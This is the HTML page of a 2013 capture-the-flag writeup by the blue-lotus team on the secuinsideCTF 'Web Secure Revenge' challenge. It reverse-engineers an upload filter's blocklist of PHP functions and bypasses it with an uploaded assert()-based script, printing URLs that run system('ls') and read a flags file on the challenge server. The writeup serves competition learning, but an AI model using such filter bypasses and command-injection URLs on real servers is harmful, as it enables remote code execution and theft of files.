@@ -1,0 +1,318 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>secuinsideCTF 2013 web secure revenge writeup - blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="This not a hard one. Bin Part mod_dontwebhack350.so is a php plugin which helps the upload site to filter files. Opening it with IDA, filtering &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net/www/secuinsidectf-2013-web-secure-revenge-writeup">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">blue-lotus</a></h1>
+  
+    <h2>Security Research Team @ Tsinghua University</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">secuinsideCTF 2013 Web Secure Revenge Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-27T00:00:00+08:00" pubdate data-updated="true">May 27<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>This not a hard one.</p>
+
+<h3><strong>Bin Part</strong></h3>
+
+<p>mod_dontwebhack350.so is a php plugin which helps the upload site to filter files.</p>
+
+<p>Opening it with IDA, filtering function <em>dontwebhack input filter()</em> is founded. The code below catches our sight:</p>
+
+<pre><code>if ( check_extension_name(v12, dest, v15) == 1 )
+    *(_DWORD *)v15 = 1;
+if ( *(_DWORD *)v15 )
+    ap_log_cerror("mod_dontwebhack300.c", 141, 3, 0, v12, *((_DWORD *)v15 + 3), v9);
+if ( check_bad_php_string(src) == 1 )
+{
+    ap_log_cerror("mod_dontwebhack300.c", 144, 3, 0, v12, "Try again.", v9);
+    result = -1;
+}
+</code></pre>
+
+<p>As mentioned above, strings that the file contains and the file&#8217;s extension name are checked.</p>
+
+<p>After a bit more exploration, it is safe to draw the conlusion that only these extension names <em>&#8220;.php&#8221; &#8220;.phtml&#8221; &#8220;.ht&#8221;</em> can be executed.</p>
+
+<pre><code>.rodata:00000F75 aPhp            db 'php',0              ; DATA XREF: check_extension_name+31o
+.rodata:00000F79 aPhtml          db 'phtml',0            ; DATA XREF: check_extension_name:loc_ACFo
+.rodata:00000F7F a_ht            db '.ht',0              ; DATA XREF: check_extension_name:loc_AF8o
+</code></pre>
+
+<p>and these strings are forbiddened in the upload file:</p>
+
+<pre><code>.data:00003060 off_3060        dd offset a?            ; DATA XREF: check_bad_php_string+17o
+.data:00003060                                         ; "&amp;lt;?&amp;quot;
+.data:00003064                 dd offset aKey          ; &amp;quot;key&amp;quot;
+.data:00003068                 dd offset aFlag         ; &amp;quot;flag&amp;quot;
+.data:0000306C                 dd offset aLocate       ; &amp;quot;locate&amp;quot;
+.data:00003070                 dd offset aInclude      ; &amp;quot;include&amp;quot;
+.data:00003074                 dd offset aRequire      ; &amp;quot;require&amp;quot;
+.data:00003078                 dd offset aFopen        ; &amp;quot;fopen&amp;quot;
+.data:0000307C                 dd offset aPassthru     ; &amp;quot;passthru&amp;quot;
+.data:00003080                 dd offset aFpassthru    ; &amp;quot;fpassthru&amp;quot;
+.data:00003084                 dd offset aSystem       ; &amp;quot;system&amp;quot;
+.data:00003088                 dd offset asc_F37       ; &amp;quot;`&amp;quot;
+.data:0000308C                 dd offset aExecl        ; &amp;quot;execl&amp;quot;
+.data:00003090                 dd offset aOpen         ; &amp;quot;open&amp;quot;
+.data:00003094                 dd offset aPopen        ; &amp;quot;popen&amp;quot;
+.data:00003098                 dd offset aEscapeshellcmd ; &amp;quot;escapeshellcmd&amp;quot;
+</code></pre>
+
+<h3><strong>Web Part</strong></h3>
+
+<p>Easy to find this php script in <em>upload.txt</em>:</p>
+
+<pre><code>if($_SERVER[&amp;#039;REQUEST_METHOD&amp;#039;] == &amp;quot;POST&amp;quot;) 
+{
+
+    $uploaddir = &amp;#039;/var/www/uploads/&amp;#039; . md5(crypt($_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;], $_POST[&amp;#039;code&amp;#039;] )) . &amp;#039;/&amp;#039;;
+
+    if(is_dir($uploaddir) == false)
+        mkdir($uploaddir);
+    if(strstr($_FILES[&amp;#039;data&amp;#039;][&amp;#039;name&amp;#039;], &amp;quot;./&amp;quot;) != FALSE) {
+    exit;
+    }
+
+
+    if(strstr($_FILES[&amp;#039;data&amp;#039;][&amp;#039;name&amp;#039;], &amp;quot;../&amp;quot;) != FALSE) {
+        exit;
+    }
+    $uploadfile = $uploaddir . basename($_FILES[&amp;#039;data&amp;#039;][&amp;#039;name&amp;#039;]);
+    if (move_uploaded_file($_FILES[&amp;#039;data&amp;#039;][&amp;#039;tmp_name&amp;#039;], $uploadfile)) {
+            echo &amp;quot;alert('Success'); document.href='./';\n";
+    } else {
+            print "alert('failed'); document.href='./';";
+    }
+
+}
+else { ...
+</code></pre>
+
+<p>We find that the file folder name is produced by <code>md5(crypt($_SERVER["REMOTE_ADDR"], $_POST['code'] ))</code>.</p>
+
+<p>It&#8217;s time to upload some php scripts.Considering the fact that special functions are banned as mentioned in the bin part, if we want to execute some commands, we can use <em>assert()</em>.</p>
+
+<p>Such php file like this is to uploaded:</p>
+
+<p>Test it.To calculate the folder name and give the get data:</p>
+
+<pre><code>http://59.9.131.155:9852/uploads/2438fc3567fb30f9e4157e19fd5f8f1e/example.php?name=system('ls%20../../../')
+</code></pre>
+
+<p>Files and folders are listed.The next step is to find out the way to read the key file.<em>fopen()</em> and <em>die()</em> is to be used. <em>cat</em> command also takes effect.</p>
+
+<p>To see that all the functions which are used to read files in php script are banned by .so.</p>
+
+<p><strong>So the <em>get</em> variable is used due to no filtering on url.</strong></p>
+
+<pre><code>http://59.9.131.155:9852/uploads/2438fc3567fb30f9e4157e19fd5f8f1e/example.php?name=die(fread(fopen(%22/home/dwh_revenge/
+flags%22,%22r%22),filesize(%22/home/dwh_revenge/flags%22)))
+</code></pre>
+
+<p>Bingo!</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">lovelydream</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-27T00:00:00+08:00" pubdate data-updated="true">May 27<span>th</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/uncategorized/'>Uncategorized</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://www.blue-lotus.net/www/secuinsidectf-2013-web-secure-revenge-writeup/" data-via="" data-counturl="http://www.blue-lotus.net/www/secuinsidectf-2013-web-secure-revenge-writeup/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/secuinside-ctf-debugd-writeup/" title="Previous Post: secuinside CTF 2013 Quals debugd writeup">&laquo; secuinside CTF 2013 Quals debugd writeup</a>
+      
+      
+        <a class="basic-alignment right" href="/secuinside-2013-game-writeup/" title="Next Post: secuinside CTF Quals 2013 game writeup">secuinside CTF Quals 2013 game writeup &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
+      </li>
+    
+      <li class="post">
+        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
